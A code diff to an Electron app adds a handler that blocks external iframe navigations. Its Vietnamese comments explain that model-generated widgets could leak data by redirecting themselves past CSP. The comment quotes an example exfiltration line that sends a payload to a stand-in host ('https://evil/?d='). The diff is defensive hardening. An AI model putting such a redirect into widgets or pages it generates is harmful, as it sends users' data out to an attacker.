@@ -88,6 +88,22 @@ export function applyNavigationGuards(win: BrowserWindow): void {
     if (/^https?:\/\//i.test(url)) void shell.openExternal(url)
     return { action: 'deny' }
   })
+  // Khung CON (iframe): widget do model sinh, output notebook. Từ Electron 25
+  // `will-navigate` KHÔNG phát cho subframe — chỉ đăng ký nó là để hở một kênh
+  // exfiltrate mà CSP không với tới: không directive nào của CSP cai quản việc
+  // một document TỰ điều hướng chính nó (`navigate-to` chưa từng ship, và
+  // `form-action` chỉ chặn `<form>`). Một widget đã được bật script chỉ cần
+  // `location.href = 'https://evil/?d=' + payload`.
+  //
+  // Và ở đây TUYỆT ĐỐI không `shell.openExternal` như nhánh khung chính bên
+  // dưới: mở trình duyệt thật của người dùng bằng một URL do model dựng chính
+  // là thứ cần chặn, không phải thứ cần chiều.
+  win.webContents.on('will-frame-navigate', (details) => {
+    if (details.isMainFrame) return
+    if (isInternalUrl(details.url)) return
+    details.preventDefault()
+    log.warn('blocked subframe navigation', { url: details.url })
+  })
   win.webContents.on('will-navigate', (e, url) => {
     if (isInternalUrl(url)) {
       if (pathOf(url) !== pathOf(win.webContents.getURL())) {
